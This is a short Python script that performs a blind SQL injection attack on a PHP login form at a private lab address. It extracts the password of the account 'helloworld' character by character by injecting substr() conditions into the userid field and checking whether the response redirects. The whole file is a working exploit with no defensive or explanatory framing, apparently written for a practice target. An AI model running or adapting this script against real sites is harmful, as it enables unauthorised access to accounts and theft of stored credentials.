# login_ok.php user password brute force attack python code
import requests
import string

url = 'http://192.168.201.130/gm/login_ok.php'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'http://192.168.201.130/gm/login.php',
}


pwd = ''
print(f"Initial: {pwd}")

st = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation

for i in range(1, 42):
    found = False
    for j in st:
        payload = {
            "referer": "http://192.168.201.130/gm/index.php",
            "userid": f"' or userid='helloworld' and substr(pwd,{i},1)='{j}' -- -",
            "pwd": "1"
        }
        
        r = requests.post(url, data=payload, headers=headers)
        
        if "index.php" in r.text or "Refresh" in r.text:
            pwd += j
            found = True
            print(f"Position {i}: '{j}' → {pwd}")
            break
                
   
print(f"Final password: {pwd}")